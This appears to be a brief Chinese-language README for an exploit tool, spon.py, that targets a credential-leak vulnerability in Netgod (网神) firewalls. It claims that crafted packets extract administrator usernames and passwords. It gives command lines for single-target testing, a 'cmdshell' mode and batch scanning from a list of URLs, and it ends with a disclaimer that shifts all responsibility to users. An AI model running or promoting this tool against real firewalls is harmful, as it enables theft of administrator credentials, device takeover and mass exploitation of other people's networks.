# 网神防火墙用户登录账号泄露漏洞
网神防火墙用户账号信息泄露漏洞，通过构造特定数据包，获取防火墙管理员登录的账号密码
![](./vuln.jpg)

## 工具利用

python spon.py -u http://127.0.0.1:1111 单个url测试

python3 spon.py -c http://127.0.0.1:1111 cmdshell模式

python3 spon.py -f url.txt 批量检测




## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
